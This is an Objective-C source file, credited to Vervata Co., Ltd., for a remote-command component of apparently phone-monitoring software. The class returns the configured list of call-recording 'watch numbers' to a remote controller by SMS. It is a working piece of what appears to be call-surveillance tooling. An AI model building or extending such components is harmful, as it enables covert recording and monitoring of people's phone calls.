
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  QueryCallRecordWatchNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "QueryCallRecordWatchNumberProcessor.h"
#import "PrefCallRecord.h"
#import "PreferenceManager.h"

@interface QueryCallRecordWatchNumberProcessor (PrivateAPI)
- (void) sendReplySMSWithResult: (NSString *) aResult; 
- (void) processQueryCallRecordWatchNumber;
@end

@implementation QueryCallRecordWatchNumberProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the QueryCallRecordWatchNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (QueryCallRecordWatchNumberProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"QueryCallRecordWatchNumberProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the QueryCallRecordWatchNumberProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"QueryCallRecordWatchNumberProcessor--->doProcessingCommand")
    [self processQueryCallRecordWatchNumber];
}

#pragma mark QueryCallRecordWatchNumberProcessor  PrivateAPI

/**
 - Method name: processQueryCallRecordWatchNumber
 - Purpose:This method is used to process query watch number
 - Argument list and description: No Return Type
 - Return description: mRemoteCmdCode (NSString *)
*/

- (void) processQueryCallRecordWatchNumber {
	DLog (@"QueryCallRecordWatchNumberProcessor--->processQueryCallRecordWatchNumber")
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefCallRecord *prefCallRecord = (PrefCallRecord *) [prefManager preference:kCallRecord];
	NSArray *watchNumberList=[prefCallRecord mWatchNumbers];
	NSString *result=NSLocalizedString(@"kQueryCallRecordWatchNumber", @"");
	for (NSString *watchNumber in watchNumberList) {
		result=[result stringByAppendingString:@"\n"];
		result=[result stringByAppendingString:watchNumber];
	}
	[self sendReplySMSWithResult:result];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aResult (NSString)
 - Return description: No return type
*/

- (void) sendReplySMSWithResult:(NSString *) aResult {
	DLog (@"QueryCallRecordWatchNumberProcessor--->sendReplySMSWithResult")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *queryCallRecordWatchNumberMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:queryCallRecordWatchNumberMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:queryCallRecordWatchNumberMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
